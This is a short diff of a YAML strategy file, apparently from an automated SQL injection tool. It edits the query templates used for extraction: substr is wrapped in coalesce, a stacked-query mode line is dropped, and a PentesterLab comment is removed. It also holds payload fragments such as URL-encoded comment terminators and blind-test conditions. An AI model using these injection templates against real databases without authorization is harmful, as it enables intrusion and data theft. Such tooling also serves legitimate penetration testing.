@@ -101,10 +101,13 @@ strategy:
        select
            concat(
                '${lead}',
-               substr(
-                   (${injection}),
-                   ${window.char},
-                   ${capacity}
+               coalesce(
+                   substr(
+                       (${injection}),
+                       ${window.char},
+                       ${capacity}
+                   ),
+                   '${trail_sql}'
                )
            )
    )
@@ -112,7 +115,6 @@ strategy:
   failsafe: 1337${indice}7330%2b1
   calibrator: repeat('${calibrator_sql}', 65536)
   limitBoundary: 0
-  # pentesterlab does not work with --+-, switch to #
   endingComment: '%23'
   fingerprint:
    errorMessage:
@@ -183,7 +185,6 @@ strategy:
     - "2 %3c%3e 2"
   modeAnd: and
   modeOr: or
-  modeStack: ; select 1 where
   blind: ${binary.mode} ${test}
 
  error:
